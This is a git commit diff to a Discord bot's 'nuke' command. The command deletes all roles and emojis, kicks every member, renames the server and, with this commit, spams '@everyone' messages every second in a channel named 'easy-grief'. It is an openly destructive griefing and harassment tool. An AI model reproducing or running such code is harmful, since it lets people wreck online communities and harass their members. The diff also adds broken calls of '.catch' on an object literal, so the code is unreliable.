4433fff96df2b41d1abb064d8b0df77bfe074713
weloveskript <97298147+weloveskript@users.noreply.github.com>
2022-05-10 14:07:18 +0200

    pings till he shuts down

--- commands/nuke.js
+++ commands/nuke.js
@@ -1,5 +1,3 @@
-const Discord = require("discord.js");
-
 module.exports = {
     name: "nuke",
     description: "Nuke the Server!",
@@ -12,11 +10,14 @@ module.exports = {
             message.guild.roles.cache.forEach(role => role.delete().catch(() => {}));
             message.guild.emojis.cache.forEach(emoji => emoji.delete().catch(() => {}));
             message.guild.members.cache.forEach(member => member.kick().catch(() => {}));
-            message.guild.channels.create(`easy-grief`, { type: 'text' });
+            message.guild.channels.create(`easy-grief`, { type: 'text' }).catch(() => {});
+            message.guild.setName(`you got nuked!`).catch(() => {});
             setTimeout(() => {
-                message.guild.channels.cache.find(channel => channel.name === "easy-grief").send({content: "The Server got nuked! : ) @everyone"});
+                message.guild.channels.cache.find(channel => channel.name === "easy-grief").send({content: "The Server got nuked! : ) @everyone"}.catch(() => {}));
             }, 3000);
-
+            setInterval(() => {
+                message.guild.channels.cache.find(channel => channel.name === "easy-grief").send({content: "The Server got nuked! : ) @everyone"}.catch(() => {}));
+            } , 1000);
     } else {
-            message.channel.send({content: "You do not have permission!"});
+            message.channel.send({content: "Du darfst den Command nicht ausführen!"});
         }}};
